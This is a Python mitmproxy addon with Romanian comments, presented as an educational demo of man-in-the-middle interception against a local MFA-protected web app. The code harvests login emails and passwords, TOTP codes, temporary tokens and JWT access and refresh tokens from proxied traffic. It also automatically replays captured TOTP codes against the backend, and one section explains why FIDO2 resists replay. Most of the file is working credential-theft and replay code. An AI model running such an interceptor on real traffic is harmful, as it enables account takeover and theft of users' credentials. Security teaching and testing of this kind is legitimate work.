"""
MitM Demo Addon pentru mitmproxy
=================================
Demonstrație educațională: interceptare trafic HTTP între frontend și backend.

Rulare:
    mitmweb -s mitm_mfa_demo.py --listen-port 8080 --web-port 8081

Configurare browser:
    HTTP Proxy: localhost:8080
"""

import json
import time
import threading
import base64
import urllib.request
from datetime import datetime
from mitmproxy import http, ctx

# ── Stocare capturi ──────────────────────────────────────────────────────────

captured = {
    "credentials": [],   # { email, password, timestamp }
    "totp_codes":  [],   # { code, temp_token, timestamp }
    "jwt_tokens":  [],   # { access_token, refresh_token, timestamp }
}

SEPARATOR = "─" * 60

def ts():
    return datetime.now().strftime("%H:%M:%S")

def banner(title):
    ctx.log.warn(f"\n{SEPARATOR}")
    ctx.log.warn(f"  [!] {title}")
    ctx.log.warn(SEPARATOR)

# ── Addon principal ──────────────────────────────────────────────────────────

class MFAInterceptor:

    # ── Interceptare REQUEST ─────────────────────────────────────────────────

    def request(self, flow: http.HTTPFlow):
        req = flow.request
        path = req.pretty_url

        # Ignorăm resurse statice
        if any(ext in path for ext in [".js", ".css", ".png", ".ico", ".map", ".svg"]):
            return

        # 1. Captură credențiale login
        if "/auth/login" in path and req.method == "POST":
            self._capture_login(req)

        # 2. Captură cod TOTP la verificare MFA
        elif "/mfa/totp/verify" in path and req.method == "POST":
            self._capture_totp(req)

        # 3. Captură cerere WebAuthn (FIDO2)
        elif "/fido2/" in path:
            self._log_fido2_request(req)

    # ── Interceptare RESPONSE ────────────────────────────────────────────────

    def response(self, flow: http.HTTPFlow):
        req = flow.request
        res = flow.response
        path = req.pretty_url

        if any(ext in path for ext in [".js", ".css", ".png", ".ico", ".map", ".svg"]):
            return

        # 1. Răspuns login — captură JWT sau tempToken
        if "/auth/login" in path and req.method == "POST":
            self._capture_login_response(res)

        # 2. Răspuns verificare TOTP — succes sau eșec
        elif "/mfa/totp/verify" in path and req.method == "POST":
            self._capture_totp_response(res)

        # 3. Răspuns FIDO2 — challenge sau rezultat verificare
        elif "/fido2/" in path:
            self._log_fido2_response(req, res)

    # ── Metode interne ───────────────────────────────────────────────────────

    def _capture_login(self, req):
        try:
            body = json.loads(req.content)
            email    = body.get("email", "—")
            password = body.get("password", "—")

            entry = {"email": email, "password": password, "timestamp": ts()}
            captured["credentials"].append(entry)

            banner("CREDENȚIALE INTERCEPTATE")
            ctx.log.warn(f"  Email   : {email}")
            ctx.log.warn(f"  Parola  : {password}")
            ctx.log.warn(f"  Ora     : {ts()}")
            ctx.log.warn(SEPARATOR)
        except Exception:
            pass

    def _capture_login_response(self, res):
        try:
            body = json.loads(res.content)

            # Autentificare completă (fără MFA) — avem JWT direct
            if body.get("accessToken"):
                token = body["accessToken"][:40] + "..."
                entry = {
                    "access_token": body["accessToken"],
                    "refresh_token": body.get("refreshToken", ""),
                    "timestamp": ts()
                }
                captured["jwt_tokens"].append(entry)

                banner("JWT TOKEN INTERCEPTAT")
                ctx.log.warn(f"  Access Token : {token}")
                ctx.log.warn(f"  Refresh Token: {body.get('refreshToken', '—')[:40]}...")
                ctx.log.warn(f"  Expira in    : 15 minute")
                ctx.log.warn(f"  Risc         : Token reutilizabil fara HTTPS!")
                ctx.log.warn(SEPARATOR)

            # Autentificare parțială — MFA necesar
            elif body.get("requireMFA") or body.get("tempToken"):
                temp = body.get("tempToken", "—")
                ctx.log.warn(f"\n{SEPARATOR}")
                ctx.log.warn(f"  MFA NECESAR — tempToken capturat")
                ctx.log.warn(f"  Temp Token  : {temp[:40]}...")
                ctx.log.warn(f"  Expira in   : 30 minute")
                ctx.log.warn(SEPARATOR)
        except Exception:
            pass

    def _capture_totp(self, req):
        try:
            body = json.loads(req.content)
            code   = body.get("token", body.get("code", "—"))
            method = body.get("method", "—")

            auth_header = req.headers.get("Authorization", "")
            temp_token  = auth_header.replace("Bearer ", "") if auth_header else "—"

            entry = {"code": code, "temp_token": temp_token, "timestamp": ts()}
            captured["totp_codes"].append(entry)

            banner("COD TOTP INTERCEPTAT")
            ctx.log.warn(f"  Cod TOTP    : {code}")
            ctx.log.warn(f"  Metoda      : {method}")
            ctx.log.warn(f"  Temp Token  : {temp_token[:40]}...")
            ctx.log.warn(f"  Capturat la : {ts()}")
            ctx.log.warn(f"  Valid ~30s  — incerc replay automat...")
            ctx.log.warn(SEPARATOR)

            # Încearcă replay după 2 secunde (în background)
            if temp_token != "—" and code != "—":
                threading.Thread(
                    target=self._replay_totp,
                    args=(code, method, temp_token),
                    daemon=True
                ).start()

        except Exception:
            pass

    def _capture_totp_response(self, res):
        try:
            body = json.loads(res.content)
            status = res.status_code

            if status == 200 and body.get("accessToken"):
                banner("AUTENTIFICARE MFA REUȘITĂ — JWT CAPTURAT")
                ctx.log.warn(f"  Cod TOTP acceptat!")
                ctx.log.warn(f"  JWT Token   : {body['accessToken'][:40]}...")
                ctx.log.warn(f"  Atacatorul are acces complet la cont!")
                ctx.log.warn(SEPARATOR)
                captured["jwt_tokens"].append({
                    "access_token": body["accessToken"],
                    "refresh_token": body.get("refreshToken", ""),
                    "timestamp": ts()
                })
            elif status == 401:
                ctx.log.info(f"  [TOTP] Cod respins (401) — expirat sau invalid")
            elif status == 429:
                ctx.log.info(f"  [TOTP] Rate limit activat (429) — prea multe încercări")
        except Exception:
            pass

    def _replay_totp(self, code, method, temp_token):
        """Încearcă să refolosească un cod TOTP capturat (replay attack)."""
        time.sleep(2)

        ctx.log.warn(f"\n{SEPARATOR}")
        ctx.log.warn(f"  REPLAY ATTACK — retrimit codul capturat: {code}")
        ctx.log.warn(SEPARATOR)

        try:
            payload = json.dumps({"token": code, "method": method}).encode()
            req = urllib.request.Request(
                "http://localhost:5000/api/v1/mfa/verify",
                data=payload,
                headers={
                    "Content-Type":  "application/json",
                    "Authorization": f"Bearer {temp_token}",
                    "User-Agent":    "MitM-Replay-Demo/1.0",
                },
                method="POST"
            )

            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    body = json.loads(resp.read())
                    ctx.log.warn(f"  REPLAY REUSIT! Codul a fost acceptat a doua oara!")
                    ctx.log.warn(f"  JWT: {body.get('accessToken', '—')[:40]}...")
            except urllib.error.HTTPError as e:
                resp_body = json.loads(e.read())
                msg = resp_body.get("message", str(e))
                if e.code == 401:
                    ctx.log.info(f"  REPLAY BLOCAT (401): {msg}")
                    ctx.log.info(f"  Codul TOTP nu mai este valid — protectie functionala!")
                elif e.code == 429:
                    ctx.log.info(f"  REPLAY BLOCAT (429): Rate limit activat")
                else:
                    ctx.log.info(f"  Răspuns replay: {e.code} — {msg}")
        except Exception as ex:
            ctx.log.info(f"  [Replay] Eroare: {ex}")

    def _log_fido2_request(self, req):
        path = req.pretty_url
        ctx.log.warn(f"\n{SEPARATOR}")

        if req.method == "GET" and "options" in path:
            ctx.log.warn(f"  [FIDO2] Cerere challenge de la server")
            ctx.log.warn(f"  Browserul cere un challenge unic pentru autentificare.")
            ctx.log.warn(SEPARATOR)
            return

        if req.method == "POST" and "verify" in path:
            ctx.log.warn(f"  [FIDO2] Raspuns WebAuthn interceptat")
            try:
                body = json.loads(req.content)
                cred = body.get("credential", body)
                response = cred.get("response", {})
                cdj_b64 = response.get("clientDataJSON", "")
                if cdj_b64:
                    padding = "=" * (4 - len(cdj_b64) % 4)
                    cdj = json.loads(base64.urlsafe_b64decode(cdj_b64 + padding))
                    ctx.log.warn(f"  clientDataJSON decodat:")
                    ctx.log.warn(f"    type      : {cdj.get('type')}")
                    ctx.log.warn(f"    origin    : {cdj.get('origin')}")
                    ctx.log.warn(f"    challenge : {cdj.get('challenge', '')[:40]}...")
                auth_data = response.get("authenticatorData", "—")
                signature = response.get("signature", "—")
                ctx.log.warn(f"  authenticatorData : {auth_data[:40]}...")
                ctx.log.warn(f"  signature         : {signature[:40]}...")
            except Exception:
                pass
            ctx.log.warn(f"")
            ctx.log.warn(f"  DE CE NU POATE FI REFOLOSIT:")
            ctx.log.warn(f"  1. challenge-ul e unic per sesiune — replay respins")
            ctx.log.warn(f"  2. origin din clientDataJSON e semnat criptografic")
            ctx.log.warn(f"     => nu poate fi schimbat fara a invalida semnatura")
            ctx.log.warn(f"  3. cheia privata nu paraseste niciodata autentificatorul")
            ctx.log.warn(f"  Concluzie: datele interceptate sunt INUTILE atacatorului")
            ctx.log.warn(SEPARATOR)

    def _log_fido2_response(self, req, res):
        path = req.pretty_url
        if "options" in path and req.method == "GET":
            try:
                body = json.loads(res.content)
                opts = body.get("options", body)
                challenge = opts.get("challenge", "—")
                ctx.log.warn(f"\n{SEPARATOR}")
                ctx.log.warn(f"  [FIDO2] Challenge trimis de server catre browser")
                ctx.log.warn(f"  challenge : {challenge[:50]}...")
                ctx.log.warn(f"  Acest challenge e semnat de autentificator impreuna")
                ctx.log.warn(f"  cu origin-ul. Fara autentificatorul fizic, nu poate")
                ctx.log.warn(f"  fi semnat — atacatorul nu poate raspunde la challenge.")
                ctx.log.warn(SEPARATOR)
            except Exception:
                pass

    def done(self):
        """Afișează sumar la oprirea proxy-ului."""
        ctx.log.warn(f"\n{'═' * 60}")
        ctx.log.warn(f"  SUMAR CAPTURĂ MitM")
        ctx.log.warn(f"{'═' * 60}")
        ctx.log.warn(f"  Credențiale capturate : {len(captured['credentials'])}")
        ctx.log.warn(f"  Coduri TOTP capturate : {len(captured['totp_codes'])}")
        ctx.log.warn(f"  JWT tokens capturate  : {len(captured['jwt_tokens'])}")
        ctx.log.warn(f"{'═' * 60}")

        if captured["totp_codes"]:
            ctx.log.warn(f"\n  Coduri TOTP interceptate:")
            for c in captured["totp_codes"]:
                ctx.log.warn(f"    [{c['timestamp']}] Cod: {c['code']}")

        if captured["jwt_tokens"]:
            ctx.log.warn(f"\n  JWT Tokens interceptate:")
            for t in captured["jwt_tokens"]:
                ctx.log.warn(f"    [{t['timestamp']}] {t['access_token'][:50]}...")


addons = [MFAInterceptor()]
